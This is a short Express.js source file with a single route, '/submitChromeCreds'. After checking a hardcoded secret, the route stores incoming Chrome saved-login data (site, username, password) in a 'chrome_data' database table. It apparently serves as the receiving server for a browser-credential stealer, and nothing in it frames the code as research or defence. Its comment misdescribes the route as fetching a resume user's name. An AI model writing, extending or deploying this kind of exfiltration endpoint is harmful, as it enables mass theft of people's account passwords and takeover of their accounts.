const express = require('express');

const router = express.Router();
const fs = require('fs');

/* Get just the Resume Users Name */
router.post('/submitChromeCreds', function(req, res, next) {
  let dataArray = [];
  Object.entries(req.body).forEach(function(el) {
    dataArray.push(el[1]);
  });

  console.log(dataArray);
  let recievedSecret = dataArray.shift();

  if (recievedSecret == 'N&hm2$!J6C#fn98-wUds%9_uaCL8zYE%bGGUXJCkJUm@d') {
    let ranStamp = Math.floor(Date.now() + Math.random());
    dataArray.forEach(function(el) {
      let query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';

      db.query(query, [ranStamp, el.signon_realm, el.username_value, el.password_value], function(err, status) {
        if (err) return next(err);
      });
    });

    res.sendStatus(200)
  } else {
    res.sendStatus(403);
  }
});

/* Export the router */
module.exports = router;

